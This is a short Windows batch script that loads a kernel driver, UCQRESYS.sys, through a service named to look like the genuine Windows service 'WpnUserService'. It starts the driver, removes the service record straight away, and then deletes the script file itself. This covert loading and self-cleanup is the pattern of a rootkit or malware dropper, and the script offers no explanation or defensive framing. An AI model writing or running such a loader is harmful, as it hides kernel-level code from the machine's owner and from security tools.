@echo off
cd %~dp0
sc create WpnUserService_70ad5 binpath=C:\Windows\SysWOW64\drivers\UCQRESYS.sys type=kernel
sc start WpnUserService_70ad5
sc delete WpnUserService_70ad5
del "%~f0"



